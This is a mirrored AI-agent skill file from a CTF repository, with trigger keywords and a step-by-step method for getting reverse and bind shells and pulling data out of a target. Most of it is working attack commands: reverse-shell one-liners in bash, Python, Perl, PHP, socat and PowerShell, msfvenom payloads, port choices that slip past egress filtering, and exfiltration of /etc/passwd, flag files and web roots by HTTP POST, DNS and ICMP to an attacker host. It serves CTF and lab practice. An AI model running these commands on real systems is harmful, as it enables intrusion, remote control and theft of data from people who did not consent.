# Reverse Shells & Data Callbacks

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/access-pivoting/reverse-shells-and-callbacks.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/access-pivoting/reverse-shells-and-callbacks.md)

---

---
name: reverse-shells-and-callbacks
category: access-pivoting
triggers: [reverse shell, bind shell, "nc -lvnp", "nc -e", netcat, ncat, socat, "4444", callback, listener, "bash -i", "/dev/tcp", pwncat, "shell stabilization", pty, exfiltrate, exfil, "data exfiltration", oob, "out-of-band", egress, "curl attacker", interactsh, "python -m http.server", "did not connect back", "no callback", "get a shell", rce]
tools: [nc, ncat, socat, pwncat, python, curl, wget, powershell, msfvenom, interactsh]
priority: high
description: Get a reverse/bind shell or out-of-band data callback from a target, choosing a callback port that survives egress filtering (reuse the target's open ports), with a fallback path when direct callbacks are blocked.
---

# Reverse Shells & Data Callbacks

## Trigger context
Fire this when you have command/code execution on a target (web RCE, injection, cron, deserialization, upload, etc.) and need either an interactive shell back to you, or to pull data OUT of the target to your host. Also when a first callback attempt failed and you need to try smarter ports/channels.

## Objective
A stable interactive shell (or a reliable data callback) from the target to your listener, verified by `id`/`whoami` and a working TTY.

## Methodology (decision tree, follow in order)
1. **Set your listener IP + pick the callback PORT.** IP = your tun0 on HTB/THM (`ip a show tun0`) or your public/routable IP. Port selection is the single biggest reason a shell "doesn't call back":
   - Try, in order: **443 -> 80 -> 53** (almost always allowed outbound).
   - Then **reuse a port the target already exposes**: if `nmap` showed **4444** (or 8080, 8443, 1337, 9001) OPEN on the target, the firewall very likely permits that port, so it is an excellent callback port. Listen on it and call back to it (e.g. `nc -lvnp 4444`).
   - Then common C2 ports: 4444, 1337, 9001, 9999.
   - Iterate one port at a time; if no connect in a few seconds, move to the next candidate.
2. **Start the listener BEFORE firing the payload.** A payload sent before the listener is up just misses.
3. **Fire the reverse-shell one-liner** matching the target OS and the binaries it actually has (bash/python/nc/socat/powershell).
4. **If it connects -> stabilize** (PTY upgrade) so arrows, tab, and Ctrl-C behave.
5. **If nothing connects on any port -> fall back** (see Branching): bind shell, web shell as command channel, OOB (DNS/ICMP), pivoted callback, or back to the global methodology.
6. **To pull data FROM the target**, use HTTP POST/GET to your listener, or DNS/ICMP exfil when only those egress.

## Commands & payloads
Listener (prefer ncat/pwncat over plain nc):
```bash
LHOST=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)   # HTB/THM
LPORT=443
nc -lvnp $LPORT                 # basic
ncat -lvnp $LPORT               # better (can add --ssl)
pwncat-cs -lp $LPORT            # auto-stabilizes + upload/download
socat -d -d TCP-LISTEN:$LPORT,reuseaddr,fork STDOUT   # fully interactive with the socat payload
```
Port-reuse heuristic (KEY IDEA):
```bash
# From your nmap, note OPEN ports. Outbound on a port the target already allows
# is far more likely to pass egress filtering than a random high port.
# Target shows 4444 open  ->  listen AND call back on 4444:
nc -lvnp 4444                   # attacker
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/4444 0>&1'   # target
# Recommended try-order when unsure:  443 -> 80 -> 53 -> target's open ports -> 4444/1337/9001
```
Linux reverse shells (use whichever binary exists):
```bash
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1'
sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
nc $LHOST $LPORT -e /bin/bash                      # only if this nc supports -e
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f   # nc WITHOUT -e
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'"$LHOST"'",'"$LPORT"'));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
socat TCP:$LHOST:$LPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
perl -e 'use Socket;$i="'"$LHOST"'";$p='"$LPORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$s=fsockopen("'"$LHOST"'",'"$LPORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
```
Windows reverse shells:
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
# Preferred fully-interactive Windows shell: ConPtyShell (Invoke-ConPtyShell) or nc64.exe -e cmd.exe if present
```
Generate a payload binary when a one-liner won't do:
```bash
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=$LPORT -f elf -o sh.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o s.exe
```
Stabilize the shell (Linux, right after connect):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or: script -qc /bin/bash /dev/null
export TERM=xterm
# Ctrl-Z to background, then on YOUR box:
stty raw -echo; fg
# fix size:
stty rows 50 cols 200
```
Bind shell (use when the target CANNOT reach you but you CAN reach it):
```bash
# target listens:
ncat -lvnp 4444 -e /bin/bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# you connect in:
nc TARGET 4444
```
Pull / exfiltrate data FROM the target:
```bash
python3 -m http.server 80                          # attacker: serve + receive
curl -sF 'f=@/etc/passwd' http://$LHOST/           # target: POST a file
wget --post-file=/root/flag.txt http://$LHOST/
tar czf - /var/www | curl -s --data-binary @- http://$LHOST/site.tgz
base64 -w0 /root/flag.txt                          # binary-safe copy/paste, decode your side
# Windows:
powershell -c "Invoke-WebRequest http://LHOST/ -Method POST -InFile C:\loot\flag.txt"
certutil -urlcache -f http://LHOST/tool.exe C:\Windows\Temp\tool.exe   # pull a tool TO target
```
Out-of-band (OOB) when only DNS/ICMP egress:
```bash
# universal receiver: interactsh-client  (gives a domain, logs DNS+HTTP hits)
for c in $(base64 -w0 /root/flag.txt | fold -w32); do dig $c.$OOB_DOMAIN +short; done  # DNS exfil
xxd -p -c8 /root/flag.txt | while read h; do ping -c1 -p $h $LHOST; done               # ICMP exfil
```

## Branching logic (if/then)
- If the shell connects but is "dumb" (no tab/history) -> run the PTY stabilization block.
- If NO callback on 443/80/53 -> try the target's OWN open ports first (e.g. 4444 if nmap showed it), then 1337/9001/9999.
- If NO port calls back at all (strict egress) -> switch to a **bind shell** (you connect in), or drive a **web shell** over the already-open HTTP service as your command channel, or go **OOB** via DNS/ICMP.
- If you only have blind web RCE -> confirm execution first with an OOB ping/DNS callback (see [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md)), then place a web shell and retry the reverse shell from inside.
- If the target is deep in an internal network you can't reach -> reverse-forward your listener through a pivot: [tunneling-port-forwarding](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--tunneling-port-forwarding.md) / [pivoting-proxychains](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--pivoting-proxychains.md), then reconnect.
- If bash/nc/python are missing -> use the mkfifo nc trick, socat, or a language that IS present (perl/php/ruby).
- If SSH creds/keys turn up -> prefer a real SSH session: [ssh-access-and-keys](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--ssh-access-and-keys.md).
- If NOTHING here works -> stop tunnel-visioning; return to [global-ctf-methodology](https://raw.githubusercontent.com/BigBread57/zametki/main/00-methodology/sa--instructions--_meta--00-global-methodology.md) and re-enumerate for a different foothold.

## Common pitfalls
- Wrong LHOST (LAN IP instead of tun0) is the #1 cause of "no callback" on HTB/THM.
- Listener started AFTER the payload -> missed connection. Always listen first.
- `nc -e` is absent on modern OpenBSD netcat -> use the mkfifo trick or ncat/socat.
- Hammering only 4444 on a filtered target -> prefer 443/80/53; reuse the target's allowed ports.
- Web-injected payloads need URL-encoding; spaces/quotes/`&` may need bypasses (`${IFS}`, base64 -d | bash).
- Dumb shells die on Ctrl-C or logout -> stabilize, and consider a persistent session (tmux, pwncat, msf).

## Proof / verification
- On the shell: `id`, `hostname`, `whoami` (Windows). After PTY upgrade, arrow keys and Ctrl-C must not kill the session.
- For exfil: confirm the received file's size and `md5sum`/`sha256sum` match the source.

## Cross-references
- [tunneling-port-forwarding](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--tunneling-port-forwarding.md) · [pivoting-proxychains](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--pivoting-proxychains.md) · [ssh-access-and-keys](https://raw.githubusercontent.com/BigBread57/zametki/main/07-access-pivoting/sa--instructions--access-pivoting--ssh-access-and-keys.md) · [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md) · [global-ctf-methodology](https://raw.githubusercontent.com/BigBread57/zametki/main/00-methodology/sa--instructions--_meta--00-global-methodology.md)

## Credible sources
- PayloadsAllTheThings, Reverse Shell Cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- HackTricks, Reverse Shells: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/
- revshells.com (reverse shell generator): https://www.revshells.com/
- pwncat-cs: https://github.com/calebstewart/pwncat
- GTFOBins: https://gtfobins.github.io/
